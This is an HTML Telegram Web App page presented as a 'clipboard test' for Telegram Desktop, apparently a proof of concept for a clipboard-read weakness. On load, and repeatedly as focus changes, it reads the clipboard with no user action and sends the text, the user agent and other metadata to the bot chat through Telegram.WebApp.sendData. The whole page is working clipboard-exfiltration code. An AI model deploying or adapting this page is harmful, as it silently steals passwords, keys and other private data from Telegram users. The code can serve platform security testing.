<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Telegram Desktop clipboard test</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  body { font: 14px/1.5 ui-monospace, Menlo, Consolas, monospace; padding: 16px; white-space: pre-wrap; }
  h1 { font-size: 16px; margin: 0 0 12px; }
  .ok { color: #8a1f11; }
  .blk { color: #0f5f2f; }
  .muted { color: #555; }
</style>
</head>
<body tabindex="-1">
<h1>Telegram Desktop clipboard test</h1>
<div id="out" class="muted">Waiting for Telegram Desktop WebView focus...</div>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
const out = document.getElementById("out");
const tg = window.Telegram && window.Telegram.WebApp;
const encoder = new TextEncoder();
let done = false;
let attempts = 0;

if (tg) {
  try {
    tg.ready();
    tg.expand();
  } catch (_) {}
}

try {
  window.focus();
  document.body.focus();
} catch (_) {}

function metadata() {
  return {
    build: "senddata-20260519-1",
    platform: (tg && tg.platform) || "n/a",
    version:  (tg && tg.version)  || "n/a",
    isSecureContext: isSecureContext,
    hasFocus: document.hasFocus(),
    visibilityState: document.visibilityState,
    userAgent: navigator.userAgent,
    time: new Date().toISOString()
  };
}

function makePayload(text, meta) {
  const maxBytes = 3900;
  let clipboard = text;
  let truncated = false;
  let payload = JSON.stringify({
    type: "clipboard-test-result",
    clipboard,
    length: text.length,
    truncated,
    meta
  });

  while (encoder.encode(payload).length > maxBytes && clipboard.length > 0) {
    truncated = true;
    clipboard = clipboard.slice(0, Math.max(0, clipboard.length - 256));
    payload = JSON.stringify({
      type: "clipboard-test-result",
      clipboard,
      length: text.length,
      truncated,
      meta
    });
  }

  return payload;
}

function schedule(delay) {
  if (!done) {
    setTimeout(runTest, delay);
  }
}

async function runTest() {
  if (done) {
    return;
  }

  attempts += 1;
  const meta = metadata();
  out.className = "muted";
  out.innerText =
    "Running test automatically...\n\n" +
    JSON.stringify({ build: meta.build, attempts, focus: meta.hasFocus, visibility: meta.visibilityState }, null, 2);

  if (!document.hasFocus() && attempts < 300) {
    schedule(100);
    return;
  }

  try {
    const text = await navigator.clipboard.readText();
    const payload = makePayload(text, meta);

    if (!tg || typeof tg.sendData !== "function") {
      throw new Error("Telegram.WebApp.sendData is unavailable for this launch method");
    }

    done = true;
    out.className = "ok";
    out.innerText =
      "Clipboard value returned. Sending result to the bot chat...\n\n" +
      "length: " + text.length + " chars\n" +
      JSON.stringify(meta, null, 2);
    tg.sendData(payload);
  } catch (e) {
    if (String(e && e.message || "").includes("Document is not focused") && attempts < 300) {
      schedule(100);
      return;
    }

    done = true;
    out.className = "blk";
    out.innerText =
      "The platform did not return clipboard text: " + e.name + ": " + e.message + "\n\n" +
      JSON.stringify(meta, null, 2);
  }
}

window.addEventListener("focus", () => schedule(0));
document.addEventListener("visibilitychange", () => schedule(0));
requestAnimationFrame(() => schedule(0));
schedule(50);
</script>
</body>
</html>
